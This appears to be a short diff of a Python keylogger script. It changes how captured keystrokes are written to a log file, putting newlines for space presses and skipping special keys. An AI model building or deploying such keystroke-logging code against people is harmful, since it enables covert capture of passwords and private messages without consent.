@@ -28,11 +28,13 @@ def write_file(keys):
 
             # Removing ''
             k = str(key).replace("'", "")
-            f.write(k)
-
-            # Explicitly adding a space after
-            # every keystroke for readability
-            f.write(" ")
+            if k.find("space") > 0:
+                f.write("\n")
+            elif k.find("Key") == -1:
+                f.write(k)
+                # Explicitly adding a space after
+                # every keystroke for readability
+                f.write(" ")
 
 
 def on_release(key):
